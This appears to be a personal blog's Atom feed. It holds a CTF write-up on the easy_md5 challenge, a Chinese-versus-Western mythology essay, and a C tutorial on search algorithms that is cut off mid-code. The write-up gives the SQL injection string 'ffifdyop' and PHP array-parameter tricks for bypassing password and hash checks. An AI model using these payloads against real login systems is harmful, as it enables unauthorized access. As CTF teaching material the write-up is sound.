<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Adam8enの8log</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-02-20T15:04:30.000Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Adam Ben</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>easy_md5のWP——SQL下的弱类型比较</title>
    <link href="http://example.com/2024/02/20/easy-md5-WP%E2%80%94%E2%80%94SQL%E4%B8%8B%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/"/>
    <id>http://example.com/2024/02/20/easy-md5-WP%E2%80%94%E2%80%94SQL%E4%B8%8B%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/</id>
    <published>2024-02-20T14:43:10.000Z</published>
    <updated>2024-02-20T15:04:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>于NSSCTF上刷到此题，觉得颇有几处新意，故整理一份WP，题目传送门如下：<a href="https://www.nssctf.cn/problem/713">(BJDCTF 2020)easy_md5 | NSSCTF</a>。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>话不多说开启容器。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240220222234112.png" alt="image-20240220222234112"></p><p>可以看到的是，进入题目后只有一份提交文本框，没什么其他信息。随便提交一个数字，网页的URL引起了我的注意。</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28685/leveldo4.php?password=1</span><br></pre></td></tr></table></figure><p>嗯，看起来像是个SQL注入。但是用sqlmap爆破无果，用BurpSuite抓包也没有得到什么有用的信息。但其实还是有信息的，如果你仔细观察响应报文，会发现文件头中出现了hint。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240220222555176.png" alt="image-20240220222555176"></p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="code"><pre><span class="line">hint: select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>果然是一条经典的MySQL语句</p><p>接下来的问题就是怎么让这条语句成立然后给出我们想要的信息了。</p><p>经过查阅资料后得知MySQL中的“万能密码”<code>ffifdyop</code>。这串字符被md5函数编码后变成<code>276f722736c95d99e921722cf9ed621c</code>，随后再经过MySQL编码就变成了<code>&#39;or&#39;6xxx</code>。其中xxx的部分是无关字符串，但是由于该字符串以6开头而被MySQL认为是整形，再和前方的部分拼接在一起，整条语句就变成了如下形式。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password &#x27;&#x27;or&#x27;6xxx&#x27;</span><br></pre></td></tr></table></figure><p>此时该SQL语句恒成立，成功执行后跳转到levels91.php，查看源代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240220223615134.png"></p><p>接下来就是简单的PHP弱类型比较了，这里可以上传md5碰撞值，也可以上传数组变量a、b，还可以直接跳转到levell14.php。</p><p>跳转到levell14.php后出现以下代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240220223810982.png" alt="image-20240220223810982"></p><p>同样的思路，由于是强类型比较所以上传碰撞值的方法失效，此时上传数组变量param1和param2即可。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题难度较为简单，但是关于万能密码<strong>ffifdyop</strong>的知识点也十分重要，有单独写一篇WP的必要，权当积累。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/AceAttorneyArtGallery.png" alt="AceAttorneyArtGallery"></p>]]></content>
    
    
    <summary type="html">关于MySQL中的“万能密码”和弱类型比较小记。</summary>
    
    
    
    <category term="CTF Write Up" scheme="http://example.com/categories/CTF-Write-Up/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>为什么说中国神话是早衰的呢？</title>
    <link href="http://example.com/2023/12/08/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%B4%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D%E6%98%AF%E6%97%A9%E8%A1%B0%E7%9A%84%E5%91%A2%EF%BC%9F/"/>
    <id>http://example.com/2023/12/08/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%B4%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D%E6%98%AF%E6%97%A9%E8%A1%B0%E7%9A%84%E5%91%A2%EF%BC%9F/</id>
    <published>2023-12-08T14:22:39.000Z</published>
    <updated>2023-12-08T14:31:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>事情是这样的，我在一个帖子底下和吧友讨论黑猴后面又说到了中国神话体系的问题，结果到后面险些引发骂战，我觉得我当时表述的意思可能不清楚，让一些吧友误以为我在刻意贬低中华神话乃至华夏文化，并对我的老师个人品和学术产生了质疑。故立此贴为证，我决定简单写一下分享一些我对于中华神话的看法，不足之处还望各位多多批评指正。</p><p>首先，什么是神话呢？我们引用马克思《&lt;政治经济学批判&gt;导言》中的话来概述一下，“任何神话都是用想象和借助想象以征服自然力，支配自然力，把自然力加以形象化”。神话或者祭祀，其实都是人类自身生活的反应。在生存的过程中，人类不断受到挑战。在敬畏大自然的同时，人们也有支配自然的欲望。于是先民们也尝试着利用自己的知识去解读各种自然现象，尝试着去克服困难，神话也就应运而生。</p><p>神话根据内容又可以分为两类，按照内容分类或者按照起源与发展的序列分类。</p><p>其中按照内容分类又可分为两类，一种是创世神话，一种是英雄神话。</p><p>我们中国是不缺乏创世神话的，女娲造人，盘古开天辟地，伏羲创世作八卦，这些都是属于我们的创世神话。</p><p>但是遗憾的是，单论汉文化，我们是没有英雄神话的，这可以说是一个小小的瑕疵。但是跳出汉文化的神话圈，藏族有《格萨尔传》，蒙古族有《江格尔》，新疆有《玛纳斯》，所以以中国的角度去看，我们也可以说我们有自己的英雄神话，只不过并不属于汉神话圈内。</p><p>第二种就是按照起源与发展的序列去分类，这又可以分为原始神话、古典神话和文明神话。一般来说，中国的神话大多都属于原始神话。</p><p>那么终于来到中国神话了，中国神话相比较于西方的神话体系，都有些什么特点呢？我认为有以下几点：</p><p>一、中国神话的内容极其丰富，但是形式却较为短小，故事性不够强。这个主要是受限于当时的语言载体，我们都知道古代所用的是文言文，篇幅一般都不会很长。《孔雀东南飞》就已经是是我国古代文学史上最早最长的一首长篇叙事诗了。我们来看比较经典的夸父逐日：</p><p>夸父与日逐走，入日；渴，欲得，饮于河、渭；河、渭不足，北饮大泽。未至，道渴而死。弃其杖，化为邓林。</p><p>一共就不到四十个字，对比希腊神话任何一篇都是不够塞牙缝的，拉出一个海无力都有一堆传记。所以说，相对于西神，中神的故事性并不强，这是我认为中神的一个特点之一。</p><p>二、神话的生态很零乱，具体表现为一个神迹有多种矛盾的说法。比如我前面提到的，我们的创世论有很多种说法，有盘古的，有女娲的，有伏羲的，冷门点还有烛阴的。在盘古神话中，太阳是他的眼睛；在后羿射日里，太阳是天帝的儿子而且有9个，最后还被后羿射掉了8个。哪怕是嫦娥奔月也有几个不同的版本，有说嫦娥是因为私心把后羿的药吞了独自成神的，有说嫦娥是被逄蒙所逼迫不得已吞药奔月的。所以说，中神并不系统，它并没有形成一个完整统一的说辞，这也是它的一个特点之一。</p><p>三、中神的神与神之间的跨区域联系很少，并没有形成一个一神独尊的中心关系网。道教文化认三清，民间认玉帝，地方上福建认妈祖最大，西南和藏疆更不用说了。这点西神做的很到位，比如希腊神话中就有主神宙斯，北欧神话有主神奥丁。希腊神话中的神灵是谱系化的，中国的神灵缺乏这种系统性，这是我认为的中神的第三个特点。</p><p>四、中神的形象较为原始，道德较为严谨。具体可见山海经等大多数民间传说中对神灵的描述，都是呈现半人半兽，或者人兽同体的特点。比如女娲就是经典的人首蛇身。在思想情感上，中神呈现出较为超凡脱俗的特点，世俗色彩淡薄。而西神则呈现出相当的世俗特点。希腊神话中，神也会偷情，会嫉妒，会恶意中伤。中国的神是神圣的，道德化的；希腊的神是世俗的，人性化的；希腊神话中的神个性更加鲜明，中国神话中的神性格模糊。这是我认为的中国神话的第四个特点。</p><p>那么，经过以上阐述，我想浅浅的小结一下。与世界其他的国家相比较，中国现存的（尤其是汉语言的）较为零碎，这是一个不争的事实。但是，这并不是因为中华民族缺乏想象力。从中国现存的神话来看，其想象力之傀异，并不逊色于任何一个国家的文化作品。我们可以预见，远古时期的中华民族，一定拥有着大量的神话，可惜后来没有得到很好的保存，逐渐散落在各个文人的作品中。</p><p>其中，神话的历史化是中国古代神话衰弱的一个主要原因。最明显的例子就是“三皇五帝”从神系变成帝系。而儒家推行的重实际黜玄想的现实主义精神，也对神话的生存造成了极大的威胁。由于正统文化的疏离，神话距离主流文化渐行渐远。在神话的发展史中，有的被载入史册成为了堂而皇之的历史，有的逐渐转化为了“传说”（传说不同于神话，它的主角更多是人而不是神，比如梁祝传说、白蛇传说、牛郎织女传说和孟姜女传说），有的则在道教徒的改编中变成了神仙之说。而真正活在民间的神话，也因为口口相传逐渐失去了其原本的模样。</p><p>简要的概述一下，中国神话曾经拥有过灿烂的时光，从现存的零星故事中我们也能瞥见一眼她当初的辉煌。但我们不得不承认的一点是，中国神话后来不可避免的走向了衰弱。但这一定是坏事吗？答案是否。我们的神话系统为什么早衰，是因为我们比其他国家更早的迈向了成熟。中华先民对现实的苦难有着极为深刻的体验。女娲补天和大禹治水都是关于洪灾的忧虑，后羿射日是关于旱灾的警醒。在各种灾害的摧残下，我们的民族还是坚强的生长了起来，并开始用现实的方法去应对灾难。于是我们更快的从记载神话步入到了记述历史，西方开始记录正儿八经的历史时中国都已经西汉了。在古代中国，世俗的王权是永远凌驾于神权之上的，换句话说就是我们不需要通过神来统治天下（虽然还是需要多多少少神化自己一点说自己是天子龙体，但五千年了这么多皇帝了懂的都懂），而西方却需要借助神权来巩固自己的统治（事实上直到欧洲中世纪神权仍然在和王权相互掣肘，教会顶峰时期甚至可以直接罢免王权），因此希腊神话得到了系统而充分的整理和加工，以此来巩固神权的合法性。而中神则保留了较原始的面貌，最后被逐渐历史化。</p><p>以上，就是我对中神的看法，以及为什么西神要比中神体系更加系统化。所以我认为如果游戏需要对神话故事进行加工和改编，西神要比中神来的更快，毕竟人家已经有成熟的模板。当然，这也不是意味着中神就难以进行改编，中神的碎片化其实是一个丰富的灵感池，给人留下来巨大的想象空间，又有利于人们对它进行更为大胆的改编和创作（黑猴出列！）。而且虽然我们的神话保存的不是很尽人意，但这其实意味着我们有与世绝伦的历史文化以及民间传说，所以比起直通上古的神话，我们更多的艺术加工都是基于我们的历史来进行二创。比如《三国演义》，现在基于汉唐，两宋为背景的IP作品也层出不穷。</p><p>最后我想强调的是，虽然中神在系统性上没有西神那么成熟，但这并不意味着我们的神话不行，甚至低西方一头。中神之瑰丽丰富同其他国家一样精彩，其彰显的中华民族精神更是在全世界独树一帜的。我热爱着这片土地，热爱着这片土地上诞生的文化。也预祝黑神话悟空能够在中神这块瑰宝上进行精彩的创作，取得出色的成绩。谢谢大家。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/5632cfa4c9496fba9fa739db609203a.jpg" alt="5632cfa4c9496fba9fa739db609203a"></p>]]></content>
    
    
    <summary type="html">个人对中国神话体系与西方神话体系的对比以及一些思考。</summary>
    
    
    
    <category term="杂谈" scheme="http://example.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="杂谈" scheme="http://example.com/tags/%E6%9D%82%E8%B0%88/"/>
    
    <category term="中国神话" scheme="http://example.com/tags/%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D/"/>
    
    <category term="西方神话" scheme="http://example.com/tags/%E8%A5%BF%E6%96%B9%E7%A5%9E%E8%AF%9D/"/>
    
  </entry>
  
  <entry>
    <title>数据结构什锦（七）——查找</title>
    <link href="http://example.com/2023/12/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94%E6%9F%A5%E6%89%BE/"/>
    <id>http://example.com/2023/12/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94%E6%9F%A5%E6%89%BE/</id>
    <published>2023-12-08T04:58:52.000Z</published>
    <updated>2023-12-08T05:02:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>连一刻也没有为图的听不懂哀悼，立刻赶来战场的是——查找！</p><hr><p>从本章开始基本的数据结构已经差不多学习完毕，开始涉及一些基础的算法知识。（其实先前已经接触了一些经典的算法了，说的就是你呢迪杰斯特拉）。查找是最为基础的算法之一，所涉及的知识点也较为简单。</p><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>那么我们这篇文章主要会学习以下几个知识点：</p><ul><li><p>顺序查找</p><p>没啥好说的，就是遍历元素直到找到为止。</p></li><li><p>折半查找</p><p>应该是借鉴了分治法的思想，能够以较好的时间复杂度查找元素，和快排类似。但是只限用于<strong>顺序储存结构</strong>的<strong>有序表</strong>。</p></li><li><p>分块查找</p><p>也没啥好说的，是一种对顺序查找的改进算法。除了查询表本身外还需要建立一个索引表，将要查找的内容分块提前筛掉一部分数据缩小搜索范围，提高效率。</p></li></ul><p>以上三点都属于<strong>静态查找</strong>，接下来是<strong>动态查找</strong>。</p><ul><li><p>二叉排序树&#x2F;BST</p><p>重点之一，相对不是很难理解。</p></li><li><p>平衡二叉树&#x2F;AVL</p><p>重点之二，有点烧脑，本篇的重心。</p></li><li><p>B+、B-等变体树</p><p>仅作为拓展内容了解即可。</p></li></ul><p>至于什么是静态查找什么是动态查找呢？静态就是说只进行查找操作，而不涉及插入或删除数据的操作；动态则不仅查找过程，还会设计插入或删除数据元素的操作。</p><p>那么闲话少说，真是开始进入正文部分。</p><h2 id="静态查找"><a href="#静态查找" class="headerlink" title="静态查找"></a>静态查找</h2><p>这里我们来简单地过一遍静态查找。</p><h3 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h3><p>为了结构还是给它点面子吧，最简单最无聊的查找算法，没有之一。手搓一个for或者while循环即可满足操作（如果你甚至不知道怎么搓循环，我很好奇你是怎么看到这的）</p><p>不过为了排版起见我还是简单地丢一段示例代码在这里。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>],b[<span class="number">10</span>],c;</span><br><span class="line">    <span class="type">_Bool</span> <span class="type">bool</span>;</span><br><span class="line">    srand((<span class="type">unsigned</span> ) time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;创建一个大小为10的无序数组……\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        a[i]=rand()%<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printf(&quot;%d&quot;,rand()%10)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;创建成功，数组为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    c=rand()%<span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n查找元素c：%d\n&quot;</span>,c);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d==%d？\n&quot;</span>,a[i],c);</span><br><span class="line">        <span class="type">bool</span>=a[i]==c;</span><br><span class="line">        <span class="comment">// printf(&quot;%d\n&quot;,bool);</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="type">bool</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;找到了\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;false\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;没找到\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与其他查找算法相比，顺序查找：</p><ul><li>优点：算法简单，适应面广。对表的结构无任何要求，无论记录是否按关键字有效都适用。</li><li>缺点：平均查找长度大，特别是当N很大时，查找效率低下。</li></ul><h3 id="拆分查找"><a href="#拆分查找" class="headerlink" title="拆分查找"></a>拆分查找</h3><p>其实我更喜欢叫它“快速查找”，因为它的思想和快速排序很像。了解过快排的都知道什么意思，不过我在这里还是简要的提一嘴。</p><p>首先折半查找只适用于一个<strong>顺序储存结构</strong>的<strong>有序表</strong>。在这个基础上，我们才能够确定查找表（为了简单起见我假设他是一个有序数组a[N]）初始的最大项和最小项，将它们的下标记为max&#x3D;N和min&#x3D;0。由max和min我们可以计算出中间值的下标，我们记为mid&#x3D;(min+max)&#x2F;2。之后要做的就是将要查找的值与中间值a[mid]进行比较来逐步缩小查找范围，每次都只在大于或小于中间值的一半进行搜索。由于拆分查找这样做每次比较能丢弃掉一半的数据，所以是十分高效的。</p><p>这里我也简单的放出它的代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickFind</span><span class="params">(<span class="type">int</span>* FindArray,<span class="type">int</span> Target,<span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> min,max,mid;</span><br><span class="line">    min=<span class="number">0</span>;</span><br><span class="line">    max=length<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n使用折半查找来查找元素%d\n&quot;</span>,Target);</span><br><span class="line">    <span class="keyword">while</span> (min&lt;=max)&#123;</span><br><span class="line">        mid=(<span class="type">int</span>)((min+max)/<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;min=%d max=%d mid=%d\n&quot;</span>,FindArray[min],FindArray[max],FindArray[mid]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d==%d?\n&quot;</span>, Target, FindArray[mid]);</span><br><span class="line">        <span class="keyword">if</span> (FindArray[mid] == Target)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;True\n找到了\n\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FindArray[mid] &lt; Target)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;False\n小了\n&quot;</span>);</span><br><span class="line">            min=mid+<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;False\n大了\n&quot;</span>);</span><br><span class="line">            max=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if (max==min) &#123;</span></span><br><span class="line">        <span class="comment">//     printf(&quot;没找到\n\n&quot;);</span></span><br><span class="line">        <span class="comment">//     return ;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;没找到\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>],c,d;</span><br><span class="line">    <span class="type">int</span> min,max,mid,length;</span><br><span class="line"></span><br><span class="line">    srand((<span class="type">unsigned</span> ) time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;生成一个有序数列\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        a[i]=rand()%<span class="number">50</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j) &#123;</span><br><span class="line">            <span class="type">int</span> temp;</span><br><span class="line">            <span class="keyword">if</span> (a[j]&lt;a[j<span class="number">-1</span>])&#123;</span><br><span class="line">                temp=a[j];</span><br><span class="line">                a[j]=a[j<span class="number">-1</span>];</span><br><span class="line">                a[j<span class="number">-1</span>]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;生成成功，数列为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c=rand()%<span class="number">50</span>;</span><br><span class="line">    d=a[rand()%<span class="number">10</span>];</span><br><span class="line">    length=<span class="keyword">sizeof</span> (a)/<span class="keyword">sizeof</span> (<span class="type">int</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;使用折半查找来查找元素c：%d\n&quot;,c);</span></span><br><span class="line">    QuickFind(a,c,length);</span><br><span class="line">    QuickFind(a,d,length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于拆分查找的特性，我们可以用一棵二叉树来表述，树中的每个节点代表一个记录，节点中的值为该记录在表中的位置，通常我们称这个描述查找过程的二叉树为<strong>判定树</strong>。</p><h3 id="分块查找"><a href="#分块查找" class="headerlink" title="分块查找"></a>分块查找</h3><p>分块查找其实更多的是一种改进算法的思想，而不是一种全新的查找算法。</p><p>首先对每个子表（或称块）建立一个索引项。索引项包括两项内容：关键字项（其值可以是表中的最大关键字）和指针项（记录该子表的第一个记录在表中的位置）。要求在分块后，数据整体按块有序，但是块的内部任仍然是无序的。</p><p>这样分块后，我们在查找元素时，可以首先按关键字查找分块的索引值快速定位查找元素的大致范围。至于如何查找索引表，可以顺序查找块，也可以二分&#x2F;拆分查找块。但是在对应的数据块中仍然是无序的，我们就只能按照顺序查找块中的元素。</p><p>由于分块查找需要先查找索引表后再查找相应的数据块，所以至少要进行<strong>两次</strong>关键词比较。</p><p>由于查找表的数据类型不定，这里就暂且不给出建立索引表的代码了。</p><h2 id="动态查找"><a href="#动态查找" class="headerlink" title="动态查找"></a>动态查找</h2><p>终于进入到本篇文章的重头戏了，重点是二叉搜索树和二叉平衡树。其中二叉搜索树是二叉平衡树的基础。这里又涉及到树的知识了，理论上说这节内容也可以归档于树的问题集。</p><h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><p>二叉搜索树的主要用途是为了做<em>搜索</em>。一般的二叉树进行搜索的最坏情况时间复杂度为O(n)，而二叉搜索树则能在最坏情况下将时间复杂度降至O(logn)。</p><h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><p>在二叉搜索树中，左子树中所有节点的值应该小于根节点的值，右子树种所有节点的值应该大于根节点的值，这就意味着：</p><ul><li>一个节点的左子树只能包含比该节点小的节点。</li><li>一个节点的右子树只能包含比该节点大的节点。</li><li>其左右子树也必须是二叉搜索树。</li></ul><p>举个例子，下图就是一棵二叉搜索树。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph TB;</span><br><span class="line">1((7))--&gt;2((4))</span><br><span class="line">1((7))--&gt;3((9))</span><br><span class="line">2((4))--&gt;4((2))</span><br><span class="line">2((4))--&gt;5((5))</span><br></pre></td></tr></table></figure><p>二叉搜索树的声明与常规二叉树的声明之间没有不同，他们之间的差别仅仅体现在节点的值上而不是结构上。但是为了方便我们重新修改了节点的名字。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTreeNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>因为二叉树特殊的性质以及根节点总是位于左子树和右子树之间，所以对二叉搜索树做中序遍历，能够得到一个有序序列。</li><li>在二叉搜索树中，我们要么只考虑左子树要么只考虑右子树，而不用同时考虑左右两个子树，因此相较于常规二叉树效率大大提高了。</li></ul><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p>二叉搜索树的主要操作如下：</p><ul><li>在二叉搜索树中查找元素&#x2F;查找最大元素&#x2F;查找最小元素</li><li>插入元素到搜索二叉树中</li><li>从二叉树搜索树中删除元素</li></ul><p>辅助操作如下：</p><ul><li>在二叉搜索树中查找第k小的元素</li><li>对二叉搜索树的节点进行排序</li></ul><h5 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h5><p>在BST中查找元素是很简单的，我们从根节点开始，依次将查找值与根节点进行比较。如果查找值大于根节点，那么就进入根节点的右子树；如果查找值小于根节点，那么就进入根节点的左子树；如果查找值等于根节点，那么查找结束；如果直到根节点的左子树或者右子树为NULL都未找到查找元素，说明代查元素不存在，我们返回NULL指针即可。</p><p>下面是具体的代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode*<span class="title function_">Find</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root,<span class="type">int</span> data)</span>&#123;<span class="comment">//递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(data&lt;root-&gt;data)</span><br><span class="line">        <span class="keyword">return</span> Find(root-&gt;left,data);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(data&gt;root-&gt;data)</span><br><span class="line">        <span class="keyword">return</span> Find(root-&gt;right,data);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode* <span class="title function_">Find</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root,<span class="type">int</span> data)</span>&#123;<span class="comment">//非递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (root)&#123;</span><br><span class="line">    <span class="keyword">if</span>(data==root-&gt;data)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(data&gt;root-&gt;data)</span><br><span class="line">        root=root-&gt;right;</span><br><span class="line">    <span class="keyword">else</span> root=root-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最坏情况下的时间复杂度为O(n)（当BST为一棵偏斜树时），这为我们之后介绍平衡二叉搜索树埋下了伏笔。</p><h5 id="查找最小元素"><a href="#查找最小元素" class="headerlink" title="查找最小元素"></a>查找最小元素</h5><p>在BST中，最小元素是最左下节点，该节点没有左孩子。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode*<span class="title function_">FindMin</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root)</span>&#123;<span 